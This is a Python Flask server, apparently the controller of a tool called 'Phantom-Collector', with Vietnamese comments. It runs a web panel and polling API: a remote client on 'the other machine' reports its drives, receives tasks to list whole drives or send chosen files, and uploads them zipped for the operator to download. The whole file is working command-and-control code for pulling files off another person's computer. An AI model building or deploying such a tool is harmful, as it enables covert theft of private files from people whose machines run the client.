# git : https://github.com/nahhididwin/Phantom-Collector



# import vài cái lib


import os
from flask import Flask, request, jsonify, render_template_string, send_from_directory, redirect, url_for
import time




app = Flask(__name__)


# Lưu file/folder j đó từ máy client vào thư mục này :)
UPLOAD_FOLDER = 'uploads'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER # yea ko có thì tạo




# xài để lưu danh sách ổ cứng từ máy kia
DRIVES_CACHE = []


# xài để lưu danh sách file/folder từ máy kia
FILE_LIST_CACHE = {}


# tác vụ đang chờ máy kia thực hiện
PENDING_TASK = {}


# tên file đang sẵn sàng để đc tải xuống hehe
DOWNLOAD_READY_FILE = None





# phần html thôi :

# template cho trang chủ (chọn ổ cứng) đây :

HTML_INDEX = """
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Điều khiển Máy kia</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f4f9; color: #333; margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1, h2 { color: #444; }
        ul { list-style: none; padding: 0; }
        li { background: #eee; margin: 5px 0; padding: 10px; border-radius: 4px; }
        a { text-decoration: none; color: #007bff; font-weight: bold; }
        a:hover { text-decoration: underline; }
        .drive-icon { margin-right: 10px; }
        .status { background-color: #ffc107; padding: 10px; border-radius: 5px; margin-bottom: 20px; text-align: center;}
    </style>
</head>
<body>
    <div class="container">
        <h1>bảng điều khiển - Máy kia</h1>
        {% if not drives %}
            <div class="status">
                đang chờ Máy Kia kết nối và gửi danh sách ổ cứng...<br>
                (trang sẽ tự động làm mới sau 5 giây)
            </div>
            <script>setTimeout(() => window.location.reload(), 5000);</script>
        {% else %}
            <h2>chọn một ổ cứng để quét:</h2>
            <ul>
                {% for drive in drives %}
                    <li>
                        <span class="drive-icon">💽</span>
                        <a href="{{ url_for('browse_drive', drive_letter=drive) }}">{{ drive }}</a>
                    </li>
                {% endfor %}
            </ul>
        {% endif %}
    </div>
</body>
</html>
"""

# template cho trang duyệt file đây


HTML_FILE_BROWSER = """
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Duyệt {{ drive_letter }}</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f4f9; }
        .container { max-width: 90%; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        a { color: #007bff; }
        .status { background-color: #ffc107; padding: 10px; border-radius: 5px; text-align: center;}
        .file-browser { border: 1px solid #ccc; max-height: 60vh; overflow-y: auto; padding: 10px; margin-top: 20px; border-radius: 5px; }
        .file-item { display: flex; justify-content: space-between; align-items: center; padding: 8px; border-bottom: 1px solid #eee; }
        .file-item:last-child { border-bottom: none; }
        .file-name { word-break: break-all; }
        .folder-icon { color: #f7d75a; margin-right: 5px; }
        .file-icon { color: #999; margin-right: 5px; }
        .download-btn { background-color: #28a745; color: white; padding: 5px 10px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <a href="/"> &larr; quay lại chọn ổ cứng</a>
        <h1>Duyệt ổ: {{ drive_letter }}</h1>
        {% if not file_list %}
            <div class="status">
                Đang yêu cầu Máy kia quét toàn bộ ổ cứng. Quá trình này có thể mất nhiều thời gian (idk)...<br>
                (trang sẽ tự động kiểm tra sau 5 giây)
            </div>
            <script>setTimeout(() => window.location.reload(), 5000);</script>
        {% else %}
            <div class="file-browser">
            {% for item in file_list %}
                <div class="file-item">
                    <span class="file-name">
                        {% if item.type == 'folder' %}
                            <span class="folder-icon">📁</span>
                        {% else %}
                            <span class="file-icon">📄</span>
                        {% endif %}
                        {{ item.path }}
                    </span>
                    <form action="{{ url_for('request_download') }}" method="post" style="display:inline;">
                        <input type="hidden" name="path" value="{{ item.path }}">
                        <button type="submit" class="download-btn">tải xuống</button>
                    </form>
                </div>
            {% endfor %}
            </div>
        {% endif %}
    </div>
</body>
</html>
"""

# template cho trang chờ tải file nè
HTML_DOWNLOADING = """
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <title>đang chuẩn bị file...</title>
    <style>
        body { font-family: sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { text-align: center; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script>
        // Hàm để kiểm tra trạng thái tải file
        async function checkStatus() {
            try {
                const response = await fetch('/check_download_status');
                const data = await response.json();
                if (data.status === 'ready') {
                    // Nếu sẵn sàng, chuyển hướng đến link tải
                    window.location.href = `/download/${data.filename}`;
                } else {
                    // Nếu chưa, tiếp tục kiểm tra sau 3 giây
                    setTimeout(checkStatus, 3000);
                }
            } catch (error) {
                console.error('Lỗi khi kiểm tra trạng thái:', error);
                setTimeout(checkStatus, 3000); // Thử lại nếu có lỗi
            }
        }
        // Bắt đầu kiểm tra ngay khi trang được tải
        window.onload = checkStatus;
    </script>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>Đang yêu cầu Máy 1 gửi file...</h2>
        <p>Vui lòng chờ. Thư mục lớn có thể mất nhiều thời gian để nén và tải lên.</p>
    </div>
</body>
</html>
"""

#  api endpoints cho Máy kia (Client) :v

@app.route('/register_client', methods=['POST'])



def register_client():
    # nhận danh sách ổ cứng từ máy kia


    global DRIVES_CACHE
    data = request.json
    DRIVES_CACHE = data.get('drives', [])
    print(f"[*] Máy 1 đã kết nối. Các ổ cứng: {DRIVES_CACHE}")
    return jsonify({"status": "ok"})




@app.route('/upload_file_list', methods=['POST'])
def upload_file_list():
    # Nhận danh sách file/folder từ máy kia
    global FILE_LIST_CACHE
    data = request.json
    drive = data.get('drive')
    files = data.get('files')
    FILE_LIST_CACHE[drive] = files
    print(f"[*] đã nhận danh sách file cho ổ {drive}.")
    return jsonify({"status": "ok"})
    



@app.route('/upload_file', methods=['POST'])
def upload_file():
    # nhận file/folder (đã nén) từ máy kia
    global DOWNLOAD_READY_FILE
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400
    
    filename = os.path.basename(file.filename)
    save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(save_path)
    DOWNLOAD_READY_FILE = filename
    print(f"[*] file '{filename}' đã được tải lên từ Máy kia và sẵn sàng.")
    return jsonify({"status": "ok"})

@app.route('/get_task')
def get_task():
    # Máy kia sẽ gọi API này liên tục để xem có việc gì cần làm không.
    global PENDING_TASK
    if PENDING_TASK:
        task_to_send = PENDING_TASK.copy()
        PENDING_TASK = {} # Xóa tác vụ sau khi gửi đi
        print(f"[*] gửi tác vụ cho Máy 1: {task_to_send}")
        return jsonify(task_to_send)
    return jsonify({}) # Không có tác vụ

# yea phần giao diện đây :

@app.route('/')
def index():
    # trang chủ : hiển thị danh sách ổ cứng thì phải
    return render_template_string(HTML_INDEX, drives=DRIVES_CACHE)

@app.route('/browse/<drive_letter>')
def browse_drive(drive_letter):
    # trang hiển thị danh sách file/folder của một ổ cứng :)
    global PENDING_TASK, FILE_LIST_CACHE
    
    # nếu chưa có cache cho ổ cứng này, tạo tác vụ quét
    if drive_letter not in FILE_LIST_CACHE:
        PENDING_TASK = {"task": "list_files", "path": drive_letter}
    
    return render_template_string(HTML_FILE_BROWSER, 
                                  drive_letter=drive_letter, 
                                  file_list=FILE_LIST_CACHE.get(drive_letter))

@app.route('/request_download', methods=['POST'])
def request_download():
    # khi người dùng bấm nút tải xuống, tạo tác vụ gửi file cho Máy 1
    global PENDING_TASK, DOWNLOAD_READY_FILE
    
    # xóa file sẵn sàng cũ (nếu có)
    DOWNLOAD_READY_FILE = None
    
    path = request.form['path']
    PENDING_TASK = {"task": "send_file", "path": path}
    return render_template_string(HTML_DOWNLOADING)

@app.route('/check_download_status')
def check_download_status():
    # API dùng cho trang chờ tải file để kiểm tra xem file đã sẵn sàng chưa =)
    if DOWNLOAD_READY_FILE:
        return jsonify({"status": "ready", "filename": DOWNLOAD_READY_FILE})
    else:
        return jsonify({"status": "pending"})

@app.route('/download/<filename>')
def download_file(filename):
    # Gửi file đã được upload về cho user :D
    global DOWNLOAD_READY_FILE
    DOWNLOAD_READY_FILE = None # reset trạng thái sau khi tải
    print(f"[*] Người dùng đang tải xuống file: {filename}")
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename, as_attachment=True)




if __name__ == '__main__':
    app.run(debug=True, port=5000)
